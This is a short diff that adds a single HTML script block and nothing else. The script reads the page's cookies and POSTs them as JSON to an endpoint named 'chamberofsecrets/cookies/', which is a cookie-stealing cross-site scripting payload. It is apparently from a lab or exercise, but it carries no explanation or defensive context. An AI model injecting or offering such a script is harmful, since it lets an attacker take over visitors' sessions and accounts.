@@ -1,0 +1,9 @@
+<script>
+  var cookie = document.cookie;
+  var http = new XMLHttpRequest();
+  http.open("POST", "chamberofsecrets/cookies/");
+  http.setRequestHeader("Content-type", "application/json");
+  var data = new Object();
+  data.content = cookie;
+  http.send(JSON.stringify(data));
+</script>
